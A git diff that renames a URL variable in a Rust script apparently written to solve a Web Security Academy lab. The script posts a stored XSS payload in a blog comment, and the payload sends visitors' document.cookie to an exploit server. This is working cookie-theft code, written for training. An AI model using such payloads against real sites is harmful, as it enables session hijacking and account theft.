@@ -45,7 +45,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net";
+    let lab_url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net";
 
     // change this to your exploit server URL
     let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net";
@@ -57,7 +57,7 @@ fn main() {
     let start_time = time::Instant::now();
 
     // put an XSS payload in a comment
-    let is_exploited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url);
+    let is_exploited = exploit_xss_in_comment_functionality(&client, lab_url, exploit_server_url);
 
     // if you injected XSS successfully
     if is_exploited {
@@ -106,11 +106,11 @@ fn build_client() -> Client {
 *******************************************************/
 fn exploit_xss_in_comment_functionality(
     client: &Client,
-    url: &str,
+    lab_url: &str,
     exploit_server_url: &str,
 ) -> bool {
     // put the payload in a comment
-    let exploit_xss = client.post(&format!("{url}/post/comment")).form(&HashMap::from(
+    let exploit_xss = client.post(&format!("{lab_url}/post/comment")).form(&HashMap::from(
        [ ("postId", "2"),
         ("comment",
         &format!("<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!")
